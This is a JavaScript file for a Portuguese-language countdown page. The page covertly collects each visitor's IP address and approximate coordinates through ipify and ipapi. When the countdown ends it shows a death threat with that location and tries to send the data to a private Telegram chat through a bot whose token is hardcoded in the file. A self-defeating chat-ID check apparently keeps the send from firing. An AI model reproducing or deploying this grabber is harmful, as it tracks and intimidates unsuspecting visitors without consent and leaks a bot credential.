// script.js - Contagem Regressiva + Envia para Telegram (Vercel)

let targetDate = new Date("2026-04-20T01:22:59").getTime();
let userIPv4 = '';
let userLatitude = '';
let userLongitude = '';
let timerInterval = null;
let alreadySent = false;

const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
const CHAT_ID = "8448614204";

function sendToTelegram() {
    if (alreadySent || !CHAT_ID || CHAT_ID === "8448614204") {
        console.warn("chat_id não configurado ou já enviado.");
        return;
    }
    alreadySent = true;

    const message = `🚨 Alguém acessou o timer!\n\n` +
                    `IP: ${userIPv4 || 'não disponível'}\n` +
                    `Latitude: ${userLatitude || 'não disponível'}\n` +
                    `Longitude: ${userLongitude || 'não disponível'}\n\n` +
                    `Horário: ${new Date().toLocaleString('pt-BR')}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) {
            console.log("✅ Mensagem enviada para o Telegram com sucesso!");
        } else {
            console.error("❌ Erro ao enviar para Telegram:", data);
        }
    })
    .catch(err => console.error("Erro na requisição Telegram:", err));
}

function updateTimer() {
    const timeNow = new Date().getTime();
    let timeLeft = targetDate - timeNow;

    if (timeLeft < 0) {
        clearInterval(timerInterval);
        
        document.getElementById("timer").innerHTML = `
            Tempo esgotado!<br>
            Prepare-se para morrer...<br><br>
            Você mora em: ${userLatitude || 'não disponível'}, ${userLongitude || 'não disponível'}<br>
            Seu IP é: ${userIPv4 || 'não disponível'}<br><br>
            Não é magia, é habilidade isto...
        `;

        sendToTelegram();   // ← Envia para o seu PV
        return;
    }

    const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
    const centiseconds = Math.floor((timeLeft % 1000) / 10);

    document.getElementById("timer").innerHTML = `
        ${days}d ${hours}h ${minutes}m ${seconds}.${centiseconds.toString().padStart(2, '0')}s
    `;
}

// Busca IP + Localização
fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        userIPv4 = data.ip;
        return fetch(`https://ipapi.co/${userIPv4}/json/`);
    })
    .then(r => r.json())
    .then(data => {
        userLatitude = data.latitude || '';
        userLongitude = data.longitude || '';
    })
    .catch(err => console.error(err));

timerInterval = setInterval(updateTimer, 100);
updateTimer();